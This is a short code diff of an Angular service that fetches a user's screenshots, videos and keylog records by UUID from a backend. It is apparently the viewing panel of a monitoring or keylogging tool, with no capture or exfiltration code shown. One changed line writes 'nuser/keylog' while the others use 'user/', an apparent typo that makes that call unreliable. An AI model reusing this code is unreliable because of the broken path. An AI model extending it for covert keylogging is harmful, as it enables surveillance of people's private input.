@@ -61,14 +61,14 @@ export class ServerService {
 
   getScreenShotsForUser(uuid: string): Observable<Media> {
     return this.http.get<Media>(
-      this.HOST + "/user/screenshots?uuid=" + uuid
+      this.HOST + "user/screenshots?uuid=" + uuid
     );
   }
   getVideosForUser(uuid: string): Observable<Media> {
-    return this.http.get<Media>(this.HOST + "/user/videos?uuid=" + uuid);
+    return this.http.get<Media>(this.HOST + "user/videos?uuid=" + uuid);
   }
   getKeylogForUser(uuid: string): Observable<Keylog> {
-    return this.http.get<Keylog>(this.HOST + "/user/keylog?uuid=" + uuid);
+    return this.http.get<Keylog>(this.HOST + "nuser/keylog?uuid=" + uuid);
   }
   decodefrom64  = () => (source: Observable<Keylog>) =>
   new Observable(observer => {
